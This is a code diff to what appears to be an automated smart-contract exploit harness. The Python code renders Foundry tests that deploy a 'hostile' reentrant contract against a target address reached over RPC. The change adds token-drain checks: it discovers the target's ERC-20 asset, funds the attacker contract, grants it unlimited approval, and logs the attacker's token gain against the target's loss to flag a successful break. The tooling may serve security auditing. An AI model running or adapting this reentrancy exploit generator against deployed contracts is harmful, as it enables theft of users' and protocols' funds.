@@ -1657,6 +1657,7 @@ def _render_reentrancy_test(
     entitlement_signature: str | None = None,
     setup_params: list[dict[str, Any]] | None = None,
     setup_payable: bool | None = None,
+    asset_signature: str | None = None,
 ):
     target_lit = f"address(uint160(0x00{target.address[2:].lower()}))"
     params = list(fn.get("inputs") or [])
@@ -1666,12 +1667,53 @@ def _render_reentrancy_test(
     setup_params = list(setup_params) if setup_params is not None else []
     setup_values = _setup_argument_samples(setup_params) if setup_signature else []
     setup_declarations, setup_expressions = _solidity_argument_declarations(
-        setup_params, setup_values, "setup", address_expression="address(hostile)"
+        setup_params, setup_values, "setup", address_expression="address(hostile)",
+        uint_expression="tokenFundingAmount" if asset_signature else "1",
     ) if setup_signature else ("", [])
     setup_suffix = ", " + ", ".join(setup_expressions) if setup_expressions else ""
     setup_call = f'abi.encodeWithSignature("{setup_signature}"{setup_suffix})' if setup_signature else ""
     payable_setup = True if setup_payable is None else setup_payable
-    setup_value = _solidity_amount_literal(seed_fund) if seed_fund and payable_setup else ("2 wei" if setup_signature and payable_setup else "0")
+    setup_value = "0" if asset_signature else (_solidity_amount_literal(seed_fund) if seed_fund and payable_setup else ("2 wei" if setup_signature and payable_setup else "0"))
+    asset_discovery = """
+        address assetToken = address(0);
+        bool assetReadOk = false;
+        bool assetDecimalsVerified = false;
+        uint256 assetDecimals = 0;
+        uint256 tokenFundingAmount = 1;
+"""
+    if asset_signature:
+        asset_discovery = f"""
+        address assetToken = address(0);
+        bool assetReadOk = false;
+        bool assetDecimalsVerified = false;
+        uint256 assetDecimals = 0;
+        uint256 tokenFundingAmount = 1;
+        {{
+            (bool assetOk, bytes memory assetData) = TARGET.staticcall(
+                abi.encodeWithSignature("{asset_signature}")
+            );
+            assetReadOk = assetOk && assetData.length >= 32;
+            if (assetReadOk) {{
+                assetToken = abi.decode(assetData, (address));
+                assetReadOk = assetToken != address(0) && assetToken.code.length > 0;
+            }}
+        }}
+        if (assetReadOk) {{
+            (bool decimalsOk, bytes memory decimalsData) = assetToken.staticcall(
+                abi.encodeWithSignature("decimals()")
+            );
+            if (decimalsOk && decimalsData.length == 32) {{
+                uint256 reportedDecimals = abi.decode(decimalsData, (uint256));
+                if (reportedDecimals <= 77) {{
+                    assetDecimals = reportedDecimals;
+                    assetDecimalsVerified = true;
+                    tokenFundingAmount = 10 ** assetDecimals;
+                }}
+            }}
+            deal(assetToken, address(hostile), tokenFundingAmount);
+            hostile.safeApproveToken(assetToken, TARGET, type(uint256).max);
+        }}
+"""
     payload_expr = (
         f'abi.encodeWithSignature("{signature}", {", ".join(encoded_args)})'
         if encoded_args else f'abi.encodeWithSignature("{signature}")'
@@ -1737,6 +1779,10 @@ def _render_reentrancy_test(
 """
 
     return _render_common_header() + f"""
+interface IERC20Lowkey {{
+    function balanceOf(address account) external view returns (uint256);
+}}
+
 contract LowkeyBreakReentrant {{
     address public immutable target;
     bytes public payload;
@@ -1753,6 +1799,24 @@ contract LowkeyBreakReentrant {{
 
     function setPayload(bytes calldata _payload) external {{
         payload = _payload;
+    }}
+
+    function _lowkeyApproveCall(address token, address spender, uint256 amount)
+        private returns (bool)
+    {{
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSignature("approve(address,uint256)", spender, amount)
+        );
+        if (!ok) return false;
+        if (data.length == 0) return true;
+        require(data.length == 32, "MALFORMED_APPROVE_RETURN");
+        return abi.decode(data, (bool));
+    }}
+
+    function safeApproveToken(address token, address spender, uint256 amount) external {{
+        if (_lowkeyApproveCall(token, spender, amount)) return;
+        require(_lowkeyApproveCall(token, spender, 0), "APPROVE_RESET_FAILED");
+        require(_lowkeyApproveCall(token, spender, amount), "APPROVE_RETRY_FAILED");
     }}
 
     function registerERC777() external returns (bool) {{
@@ -1844,8 +1908,11 @@ contract LowkeyBreakReentrancy is Test {{
         hostile.setPayload(payload);
         bool erc777ReceiverRegistered = hostile.registerERC777();
         console2.log("ERC777_RECEIVER_REGISTERED", erc777ReceiverRegistered);
+{asset_discovery}
 {argument_declarations}
 {setup_block}
+        uint256 attackerTokenBefore = assetReadOk ? IERC20Lowkey(assetToken).balanceOf(address(hostile)) : 0;
+        uint256 targetTokenBefore = assetReadOk ? IERC20Lowkey(assetToken).balanceOf(TARGET) : 0;
         uint256 beforeHostile = address(hostile).balance;
         uint256 beforeTarget = TARGET.balance;
         uint256 entitlementBeforeAttack = 0;
@@ -1867,7 +1934,19 @@ contract LowkeyBreakReentrancy is Test {{
             ? afterHostile - beforeHostile - outerInput
             : 0;
         uint256 targetLoss = beforeTarget > afterTarget ? beforeTarget - afterTarget : 0;
+        uint256 attackerTokenAfter = assetReadOk ? IERC20Lowkey(assetToken).balanceOf(address(hostile)) : 0;
+        uint256 targetTokenAfter = assetReadOk ? IERC20Lowkey(assetToken).balanceOf(TARGET) : 0;
+        uint256 tokenReceived = attackerTokenAfter > attackerTokenBefore
+            ? attackerTokenAfter - attackerTokenBefore : 0;
+        uint256 targetTokenLoss = targetTokenBefore > targetTokenAfter
+            ? targetTokenBefore - targetTokenAfter : 0;
 
+        console2.log("ASSET_TRACKING_AVAILABLE", assetReadOk);
+        console2.log("ASSET_DECIMALS_VERIFIED", assetDecimalsVerified);
+        console2.log("ASSET_DECIMALS", assetDecimals);
+        console2.log("TOKEN_FUNDING_AMOUNT", tokenFundingAmount);
+        console2.log("ATTACKER_TOKEN_RECEIVED", tokenReceived);
+        console2.log("TARGET_TOKEN_LOSS", targetTokenLoss);
         console2.log("LOWKEY_BREAK_FAMILY", "reentrancy");
         console2.log("HOSTILE_WRAPPER_SUCCESS", outer);
         console2.log("TARGET_SETUP_SUCCESS", hostile.lastSeedSuccess());
@@ -1899,8 +1978,15 @@ contract LowkeyBreakReentrancy is Test {{
             && hostile.successes() > 0
             && received > 1 wei
             && targetLoss > 1 wei;
+        bool exceededTokenEntitlement = entitlementBeforeAttackOk
+            && hostile.successes() > 0
+            && tokenReceived > entitlementBeforeAttack;
+        bool genericTokenBreak = assetReadOk
+            && hostile.successes() > 0
+            && tokenReceived > 1
+            && targetTokenLoss > 1;
 
-        if (exceededEntitlement || genericValueBreak) {{
+        if (exceededEntitlement || genericValueBreak || exceededTokenEntitlement || genericTokenBreak) {{
             console2.log("LOWKEY_BREAK", true);
         }} else {{
             console2.log("LOWKEY_BREAK", false);
@@ -2397,6 +2483,7 @@ def _run_family(host, config, rpc: str, target: Target, fn: dict[str, Any], fami
             setup_params = list(setup_function.get("inputs") or []) if setup_function else []
             setup_payable = bool(setup_function and str(setup_function.get("stateMutability") or "").lower() == "payable")
             entitlement_signature = _find_entitlement_getter_signature(all_functions)
+            asset_signature = _find_asset_getter_signature(all_functions)
             body = _render_reentrancy_test(
                 target,
                 fn,
@@ -2408,6 +2495,7 @@ def _run_family(host, config, rpc: str, target: Target, fn: dict[str, Any], fami
                 entitlement_signature=entitlement_signature,
                 setup_params=setup_params,
                 setup_payable=setup_payable,
+                asset_signature=asset_signature,
             )
         except ValueError as error:
             return AttackResult(
